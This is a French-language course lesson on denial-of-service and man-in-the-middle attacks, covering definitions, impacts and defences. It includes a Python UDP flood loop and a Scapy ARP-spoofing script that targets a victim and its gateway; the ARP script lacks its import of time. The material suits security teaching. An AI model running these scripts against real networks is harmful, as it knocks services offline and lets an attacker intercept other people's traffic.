<section id="session78" class="content-section">
            <h2>Séance 78 : Analyse des Attaques Réseau (DoS, Man-in-the-Middle)</h2>

            <h3>Objectif Global :</h3>
            <p>
                Cette séance a pour but d'explorer les principales attaques réseau, en particulier les attaques <strong>DoS (Denial of Service)</strong> et <strong>Man-in-the-Middle (MITM)</strong>. 
                Nous analyserons comment elles fonctionnent, leurs impacts, et les méthodes de prévention.
            </p>
        
            <h3>1. Introduction aux Attaques Réseau</h3>
        
            <p>
                Une attaque réseau vise à perturber, intercepter ou manipuler les communications entre des systèmes informatiques. 
                Parmi les attaques les plus courantes, on trouve :
            </p>
            <ul>
                <li><strong>Les attaques par Déni de Service (DoS / DDoS)</strong> : Elles visent à surcharger un serveur pour le rendre indisponible.</li>
                <li><strong>Les attaques Man-in-the-Middle (MITM)</strong> : Elles permettent à un attaquant d'intercepter ou d'altérer des communications.</li>
            </ul>
        
            <h3>2. Attaque par Déni de Service (DoS & DDoS)</h3>
        
            <h4>Définition</h4>
            <p>
                Une attaque <strong>Denial of Service (DoS)</strong> consiste à inonder un serveur de requêtes afin de l’empêcher de répondre aux utilisateurs légitimes.
                Lorsqu'elle est effectuée depuis plusieurs machines simultanément, on parle de <strong>Distributed Denial of Service (DDoS)</strong>.
            </p>
        
            <h4>Schéma Illustratif :</h4>
            <p><img src="https://www.it-connect.fr/wp-content-itc/uploads/2022/08/Schema-attaque-DoS.png" alt="Schéma d'une attaque DoS" width="600"></p>
            <p><small>Illustration d'une attaque DoS où un attaquant envoie un grand nombre de requêtes à un serveur pour le surcharger.</small></p>
            <p><small><a href="https://www.it-connect.fr/quest-ce-quune-attaque-ddos/" target="_blank">Lien du graphique</a></small></p>
        
            <h4>Exemples d’attaques DoS :</h4>
            <ul>
                <li><strong>Attaque SYN Flood :</strong> L'attaquant envoie un grand nombre de requêtes de connexion TCP incomplètes.</li>
                <li><strong>Attaque UDP Flood :</strong> Inondation du serveur avec des paquets UDP aléatoires.</li>
                <li><strong>Attaque HTTP Flood :</strong> Envoi massif de requêtes HTTP pour surcharger un site web.</li>
            </ul>
        
            <h4>Impact d’une attaque DoS :</h4>
            <ul>
                <li>Indisponibilité du service pour les utilisateurs légitimes.</li>
                <li>Ralentissement des performances du serveur.</li>
                <li>Perte financière et atteinte à la réputation de l’organisation ciblée.</li>
            </ul>
        
            <h4>Exemple d’attaque DoS avec Python :</h4>
            <pre><code class="python">
        import socket
        import time
        
        cible = "127.0.0.1"  # Adresse IP cible
        port = 80  # Port cible
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = b"Attaque DoS"
        
        while True:
            sock.sendto(message, (cible, port))
            print("Paquet envoyé !")
            time.sleep(0.01)  # Pause pour ralentir l'attaque (à ne pas utiliser dans un vrai environnement)
            </code></pre>
        
            <p><strong>ATTENTION :</strong> Ce code est à des fins éducatives uniquement. Il est illégal d’effectuer une attaque DoS sans autorisation.</p>
        
            <h4>Méthodes de Prévention :</h4>
            <ul>
                <li>Utilisation de pare-feu et de systèmes de détection d’intrusion (IDS).</li>
                <li>Limitation du nombre de requêtes par adresse IP.</li>
                <li>Mise en place d’un service de protection DDoS (Cloudflare, AWS Shield).</li>
            </ul>
        
            <h3>3. Attaque Man-in-the-Middle (MITM)</h3>
        
            <h4>Définition</h4>
            <p>
                Une attaque <strong>Man-in-the-Middle (MITM)</strong> permet à un attaquant d’intercepter et de modifier les communications entre deux parties sans qu'elles ne s’en aperçoivent.
            </p>
        
            <h4>Schéma Illustratif :</h4>
            <p><img src="https://blog.lockself.com/hs-fs/hubfs/Sch%C3%A9ma%20attaque%20Man-in-the-middle-2.png?width=3840&height=2160&name=Sch%C3%A9ma%20attaque%20Man-in-the-middle-2.png" alt="Schéma MITM" width="600"></p>
            <p><small>Illustration d'une attaque MITM où l'attaquant intercepte la communication entre deux parties.</small></p>
            <p><small><a href="https://blog.lockself.com/attaque-par-homme-du-milieu" target="_blank">Lien du graphique</a></small></p>
        
            <h4>Exemples d’attaques MITM :</h4>
            <ul>
                <li><strong>Usurpation d’ARP (ARP Spoofing) :</strong> L’attaquant trompe les machines du réseau pour intercepter le trafic.</li>
                <li><strong>Faux points d’accès Wi-Fi :</strong> Un pirate crée un Wi-Fi malveillant pour espionner les connexions.</li>
                <li><strong>Injection HTTPS :</strong> Manipulation du trafic sécurisé pour insérer des scripts malveillants.</li>
            </ul>
        
            <h4>Impact d’une attaque MITM :</h4>
            <ul>
                <li>Vol d’informations sensibles (mots de passe, données bancaires).</li>
                <li>Modification du contenu des messages échangés.</li>
                <li>Compromission de sessions utilisateur.</li>
            </ul>
        
            <h4>Exemple d’attaque MITM avec Scapy (Python) :</h4>
            <pre><code class="python">
        from scapy.all import *
        import os
        
        victime_ip = "192.168.1.10"
        passerelle_ip = "192.168.1.1"
        
        def spoof(target_ip, spoof_ip):
            packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
            send(packet, verbose=False)
        
        while True:
            spoof(victime_ip, passerelle_ip)
            spoof(passerelle_ip, victime_ip)
            time.sleep(2)
            </code></pre>
        
            <p><strong>ATTENTION :</strong> Cette attaque est illégale sans autorisation et ne doit être utilisée que dans un cadre légal et éthique.</p>
        
            <h4>Méthodes de Prévention :</h4>
            <ul>
                <li>Utilisation de <strong>HTTPS</strong> pour sécuriser les communications.</li>
                <li>Activation de la détection d’attaques ARP sur les routeurs.</li>
                <li>Utilisation de VPN pour crypter le trafic réseau.</li>
            </ul>
        
            <h3>4. Comparaison des Attaques DoS et MITM</h3>
        
            <table border="1" cellpadding="5">
                <tr>
                    <th>Critères</th>
                    <th>DoS/DDoS</th>
                    <th>MITM</th>
                </tr>
                <tr>
                    <td>Objectif</td>
                    <td>Rendre un service indisponible</td>
                    <td>Intercepter ou modifier des communications</td>
                </tr>
                <tr>
                    <td>Impact</td>
                    <td>Blocage de sites, services inaccessibles</td>
                    <td>Vol d’informations, espionnage</td>
                </tr>
                <tr>
                    <td>Prévention</td>
                    <td>Protection DDoS, limitation des requêtes</td>
                    <td>HTTPS, VPN, détection d’attaques ARP</td>
                </tr>
            </table>
        
            <h3>Conclusion</h3>
            <p>
                Cette séance a permis d’analyser deux attaques réseau majeures. 
                Nous avons vu comment elles fonctionnent, leurs conséquences et les méthodes de protection. 
                Il est essentiel de comprendre ces attaques pour mieux sécuriser les systèmes informatiques.
            </p>
        </section>